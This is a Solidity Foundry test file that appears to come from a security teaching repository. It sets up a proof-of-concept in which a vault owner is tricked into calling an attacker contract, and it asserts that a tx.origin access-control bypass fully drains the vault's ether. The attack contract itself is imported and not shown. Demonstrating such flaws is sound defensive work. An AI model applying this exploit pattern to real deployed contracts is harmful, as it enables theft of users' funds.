// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/vulnerable/access-control/BadModifierVault.sol";
import "../src/attacker/access-control/TXOriginByPassAttack.sol";

contract BadModifierPoCTest is Test {
    BadModifierVault vault;
    TXOriginByPassAttack attackerContract;

    address ownerEOA = address(0xA);
    address attackerEOA = address(0xB);

    function setUp() public {
        vm.deal(ownerEOA, 100 ether);
        vm.deal(attackerEOA, 1 ether);

        // Owner deploys vault
        vm.startPrank(ownerEOA);
        vault = new BadModifierVault{value: 50 ether}();
        vm.stopPrank();

        // Attacker deploys attack contract
        vm.startPrank(attackerEOA);
        attackerContract = new TXOriginByPassAttack(address(vault));
        vm.stopPrank();
    }

    function test_TXOriginBypassExploit() public {
        uint256 vaultBefore = address(vault).balance;

        // 🔥 OWNER is tricked into calling attacker contract
        vm.prank(ownerEOA);
        attackerContract.exploit();

        uint256 vaultAfter = address(vault).balance;
        uint256 attackerContractBalance = address(attackerContract).balance;

        console.log("Vault before:", vaultBefore);
        console.log("Vault after:", vaultAfter);
        console.log("Attacker contract balance:", attackerContractBalance);

        assertEq(vaultAfter, 0);
        assertGt(attackerContractBalance, 0);
    }
}
